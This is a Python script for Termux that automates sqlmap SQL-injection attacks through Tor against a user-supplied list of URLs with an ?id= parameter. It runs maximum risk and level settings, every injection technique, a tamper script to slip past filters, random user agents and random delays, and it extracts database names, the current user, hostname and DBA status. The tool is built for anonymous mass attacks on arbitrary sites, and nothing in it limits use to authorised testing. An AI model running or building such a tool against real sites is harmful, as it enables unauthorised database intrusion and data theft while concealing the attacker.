#!/data/data/com.termux/files/usr/bin/python3
import os, subprocess, time, random, sys

# Colors
GREEN = "\033[1;32m"
RED = "\033[1;31m"
YELLOW = "\033[1;33m"
BLUE = "\033[1;34m"
RESET = "\033[0m"

def printc(color, msg):
    print(f"{color}{msg}{RESET}")

def check_tor():
    result = subprocess.run(["pgrep", "-x", "tor"], stdout=subprocess.DEVNULL)
    if result.returncode == 0:
        printc(GREEN, "[✓] Tor already running")
    else:
        printc(YELLOW, "[!] Tor not running. Starting now...")
        subprocess.Popen(["tor"])
        time.sleep(10)
        printc(GREEN, "[✓] Tor started")

def get_tor_ip():
    try:
        output = subprocess.check_output(["torsocks", "curl", "-s", "https://ifconfig.me"])
        return output.decode().strip()
    except:
        return "Unavailable"

def get_urls():
    try:
        url_file = input(f"{BLUE}📁 URL list file (one per line): {RESET}")
        if not os.path.isfile(url_file):
            raise FileNotFoundError
        with open(url_file, "r") as f:
            urls = [line.strip() for line in f if line.strip()]
            if not urls:
                raise ValueError
            return urls
    except:
        printc(YELLOW, "[!] File not found or empty.")
        printc(BLUE, "ℹ️  Enter fallback input (single URL or .txt file path).")
        fallback = input(f"🌐 Enter URL or .txt file path with ?id=: ").strip()
        if fallback.endswith(".txt") and os.path.isfile(fallback):
            with open(fallback, "r") as f:
                return [line.strip() for line in f if "?id=" in line]
        elif "?id=" in fallback:
            return [fallback]
        else:
            printc(RED, "[!] Must contain ?id= parameter. Exiting.")
            sys.exit(1)

def run_sqlmap(url):
    printc(YELLOW, f"➡️ Tor IP:\n{get_tor_ip()}")
    printc(GREEN, f"[+] Running SQLMap on: {url}")
    
    sqlmap_cmd = [
        "python3", "sqlmap.py",
        "-u", url,
        "--batch",
        "--random-agent",
        "--risk", "3",
        "--level", "5",
        "--threads", "5",
        "--dbs",
        "--current-user",
        "--current-db",
        "--hostname",
        "--is-dba",
        "--banner",
        "--technique", "BEUSTQ",
        "--tamper", "space2comment",
        "--tor",
        "--tor-type", "SOCKS5",
        "--proxy", "socks5://127.0.0.1:9050",
        "--delay", str(random.randint(5, 10))
    ]

    try:
        subprocess.run(sqlmap_cmd, check=True)
    except subprocess.CalledProcessError:
        printc(RED, f"[✗] SQLMap failed for {url}")

def main():
    printc(GREEN, "🛡️  Advanced SQLMap + Tor Auto Scanner v5.3")
    check_tor()
    url_list = get_urls()

    for i, url in enumerate(url_list, 1):
        printc(BLUE, f"[{i}/{len(url_list)}] Target: {url}")
        run_sqlmap(url)
        time.sleep(3)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        printc(RED, "\n[✗] Scan cancelled by user.")
